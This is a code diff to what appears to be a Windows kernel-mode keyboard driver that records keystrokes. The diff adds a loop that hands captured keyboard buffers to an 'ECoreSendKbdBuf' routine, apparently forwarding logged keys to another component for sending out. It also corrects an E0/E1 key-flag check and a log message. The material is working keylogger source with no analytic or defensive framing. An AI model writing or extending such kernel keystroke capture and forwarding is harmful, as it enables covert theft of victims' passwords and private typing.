@@ -1,5 +1,7 @@
 #include <inc/keybrd.h>
 #include <inc/klogger.h>
+#include <inc/ecore.h>
+
 #include <Ntstrsafe.h>
 #include <ntddkbd.h>
 #define __SUBCOMPONENT__ "keybrd"
@@ -207,6 +209,7 @@ NTSTATUS
         KLog(LError, "RtlStringCchPrintfExA err %x", Status);
         goto cleanup;
     }
+
     if (Key->Flags & KEY_BREAK) {
         Status = RtlStringCchPrintfExA(Buff, Remains, &Buff, &Remains, 0, "%s;", "up");
         if (!NT_SUCCESS(Status)) {
@@ -229,7 +232,7 @@ NTSTATUS
         }
     }
     
-    if (Key->Flags & KEY_E0) {
+    if (Key->Flags & KEY_E1) {
         Status = RtlStringCchPrintfExA(Buff, Remains, &Buff, &Remains, 0, "%s;", "E1"); 
         if (!NT_SUCCESS(Status)) {
             KLog(LError, "RtlStringCchPrintfExA err %x", Status);
@@ -315,8 +318,9 @@ VOID KbdThreadRoutine(PVOID Context)
     LIST_ENTRY FlushQueue;
     PKBD_BUF Buff;
     PLIST_ENTRY ListEntry;
-    ULONG i;
-    
+    ULONG cBufs;
+	PKBD_BUFF_ENTRY BufEntry = NULL;
+
     KLog(LInfo, "Kbd thread started %p\n", PsGetCurrentThread());
 
     while (TRUE) {
@@ -326,6 +330,7 @@ VOID KbdThreadRoutine(PVOID Context)
         }
 
         InitializeListHead(&FlushQueue);
+		cBufs = 0;
 
         KeAcquireSpinLock(&Kbd->Lock, &Irql);
         while (!IsListEmpty(&Kbd->FlushQueue)) {
@@ -339,14 +344,19 @@ VOID KbdThreadRoutine(PVOID Context)
             Buff = CONTAINING_RECORD(ListEntry, KBD_BUF, ListEntry);
             
             KbdSaveKbdBufContent(Kbd, Buff);
+			cBufs++;
             KbdFreeBuffer(Kbd, Buff);
         }
+
+		while ((!Kbd->ThreadStop) && (cBufs > 0) && ((BufEntry = KbdBuffGet(FALSE)) != NULL)) {
+			ECoreSendKbdBuf(BufEntry);
+		}
 
         if (Kbd->ThreadStop)
             break;
     }
 
-    KLog(LInfo, "Log thread stopped %p\n", PsGetCurrentThread());
+    KLog(LInfo, "Kbd thread stopped %p\n", PsGetCurrentThread());
 }
 
 NTSTATUS KbdThreadStart(PKBD_CONTEXT Kbd)
